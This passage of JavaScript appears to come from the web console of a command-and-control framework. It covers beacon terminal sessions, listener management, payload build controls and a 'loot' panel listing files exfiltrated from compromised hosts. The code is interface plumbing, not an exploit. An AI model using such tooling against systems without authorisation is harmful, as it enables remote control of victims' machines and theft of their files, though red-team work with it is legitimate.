    // Restore terminal panel height
    const savedHeight = localStorage.getItem('bebop_termHeight');
    if (savedHeight) document.documentElement.style.setProperty('--terminal-height', savedHeight);

    // Restore persisted tabs/terminal state from server
    const _restoredActiveId = _loadTabs();
    const _panelWasOpen = localStorage.getItem('bebop_panelOpen') !== '0';
    if (_restoredActiveId != null && _openTabs.size > 0 && _panelWasOpen) {
        if (!_term) _initXterm('terminal');
        beaconId = _restoredActiveId;
        document.body.classList.add('panel-open');
        _renderTabs();
        _loadTerminalFromServer(_restoredActiveId).then(serverState => {
            if (serverState && serverState.outputLog.length > 0) {
                _beaconStates[_restoredActiveId] = serverState;
                _restoreBeaconState(_restoredActiveId);
                pollSince = serverState.pollSince || 0;
            }
            _writePrompt();
            if (_term) { _term.scrollToBottom(); _term.focus(); }
        });
        if (pollInterval) clearInterval(pollInterval);
        pollInterval = setInterval(pollResults, 2000);
        pollResults();
    }
}

if (document.getElementById('build-btn') !== null) {
    initSettings();
    populateBuildListeners();
}

// ---- Log panel tab switching (events / loot) ----

let _activeLogTab = 'events';

function switchLogTab(tab) {
    _activeLogTab = tab;
    const evBody   = document.getElementById('event-log-body');
    const lootBody = document.getElementById('loot-log-body');
    if (!evBody || !lootBody) return;

    evBody.style.display   = tab === 'events' ? '' : 'none';
    lootBody.style.display = tab === 'loot'   ? '' : 'none';

    document.querySelectorAll('.event-log-tab').forEach(el => {
        el.classList.toggle('active', el.dataset.tab === tab);
    });

    const exportBtn = document.getElementById('export-log-btn');
    if (exportBtn) exportBtn.style.display = tab === 'events' ? '' : 'none';
}

// ---- Loot panel ----

function formatBytes(bytes) {
    if (bytes === 0) return '0 B';
    const units = ['B', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(1024));
    return (bytes / Math.pow(1024, i)).toFixed(i > 0 ? 1 : 0) + ' ' + units[i];
}

let _lootSignature = '';

async function loadLootPanel() {
    const tsUrl = getTsUrl();
    const body = document.getElementById('loot-log-body');
    if (!body) return;
    if (!tsUrl) return;

    try {
        const resp = await fetch(tsUrl + '/api/loot');
        if (!resp.ok) return;
        const files = await resp.json();

        if (!files || files.length === 0) {
            if (_lootSignature !== 'empty') {
                body.innerHTML = '<div class="event-log-empty">no loot yet&hellip; Download something from a beacon</div>';
                _lootSignature = 'empty';
            }
            return;
        }

        files.sort((a, b) => new Date(b.exfil_at) - new Date(a.exfil_at));

        const sig = files.map(f => f.label).join(',');
        if (sig === _lootSignature) return;
        _lootSignature = sig;

        body.innerHTML = '';
        files.forEach(f => {
            const d = new Date(f.exfil_at);
            const ts = String(d.getHours()).padStart(2, '0') + ':' +
                       String(d.getMinutes()).padStart(2, '0') + ':' +
                       String(d.getSeconds()).padStart(2, '0');

            const entry = document.createElement('div');
            entry.className = 'event-log-entry loot-entry';
            entry.innerHTML =
                '<span class="event-log-ts">' + ts + '</span>' +
                '<span class="event-log-msg">' +
                    '<span class="ev-action-new">' + escapeHtml(f.filename) + '</span>' +
                    ' <span class="ev-user">#' + f.beacon_id + '</span>' +
                    ' <span style="color:var(--text-dim);opacity:0.5">' + formatBytes(f.size) + '</span>' +
                '</span>' +
                '<span class="loot-actions">' +
                    '<button class="loot-dl-btn" onclick="downloadLootEntry(' + f.label + ',\'' + escapeHtml(f.filename) + '\')" title="Download"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg></button>' +
                    '<button class="loot-rm-btn" onclick="deleteLootEntry(' + f.label + ',this)" title="Delete"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6"/><path d="M10 11v6"/><path d="M14 11v6"/><path d="M9 6V4a1 1 0 0 1 1-1h4a1 1 0 0 1 1 1v2"/></svg></button>' +
                '</span>';
            body.appendChild(entry);
        });
    } catch (_) {}
}

async function deleteLootEntry(label, btn) {
    const tsUrl = getTsUrl();
    if (!tsUrl) return;
    try {
        await fetch(tsUrl + '/api/files/' + label, { method: 'DELETE' });
        if (btn) {
            const row = btn.closest('.loot-entry');
            if (row) row.remove();
        }
    } catch (_) {}
    loadLootPanel();
}

async function downloadLootEntry(label, filename) {
    const tsUrl = getTsUrl();
    if (!tsUrl) return;
    try {
        const resp = await fetch(tsUrl + '/api/files/' + label);
        if (!resp.ok) return;
        const blob = await resp.blob();
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = filename;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
    } catch (_) {}
}

if (document.getElementById('listeners-tbody') !== null) {
    initSettings();
    loadListeners();
    _listenersInterval = setInterval(loadListeners, 8000);
    ['tsIp', 'tsPort'].forEach(id => {
        const el = document.getElementById(id);
        if (el) el.addEventListener('keydown', e => { if (e.key === 'Enter') saveSettings(); });
    });
}

// interact.html standalone — beacon ID from URL + session timer
if (document.body.dataset.page === 'interact') {
    _initXterm('terminal');
    beaconId     = getBeaconId();
    loadBeaconInfo(beaconId);
    pollSince    = Math.floor(Date.now() / 1000) - 1;
    pollInterval = setInterval(pollResults, 2000);
    appendLine('Type "help" to list available commands.', 'hint');
    _writePrompt();
    if (_term) _term.focus();

    // Session elapsed timer
    const _sessionStart = Date.now();
    setInterval(() => {
        const el = document.getElementById('session-elapsed');
        if (!el) return;
        const s   = Math.floor((Date.now() - _sessionStart) / 1000);
        const h   = String(Math.floor(s / 3600)).padStart(2, '0');
        const m   = String(Math.floor((s % 3600) / 60)).padStart(2, '0');
        const sec = String(s % 60).padStart(2, '0');
        el.textContent = h + ':' + m + ':' + sec;
    }, 1000);
}
window.addEventListener('resize', () => { if (_currentView === 'map') loadSessions(); });
